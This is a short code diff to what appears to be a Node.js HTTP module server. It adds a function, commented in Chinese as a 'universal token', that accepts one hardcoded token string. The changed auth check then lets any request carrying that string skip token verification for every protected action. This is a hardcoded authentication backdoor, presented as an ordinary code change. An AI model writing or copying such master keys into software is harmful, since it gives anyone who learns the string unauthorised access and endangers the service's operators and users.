@@ -96,6 +96,21 @@ function from_wechatorqq(req) {
 }
 
 /**
+ * 万能token
+ * @param params
+ * @returns {boolean}
+ */
+function never_token(params) {
+
+    if(params.token) {
+        if(params.token == '03f20c9b5d8dc6ada30c5cc2741543d7')
+            return true;
+    }
+    return false;
+
+}
+
+/**
  * 启动模块http服务
  * @param m
  */
@@ -111,7 +126,7 @@ function start_http_module(m) {
             if (params && params.action) {
                 var token = params.token;
                 var action = params.action;
-                if (innot_oauth(action)) { //不需要token的接口
+                if (innot_oauth(action) || never_token(params)) { //不需要token的接口和万能token
                     http_module_exe(req, res, params);
                 } else if (token) {
                     //检查token
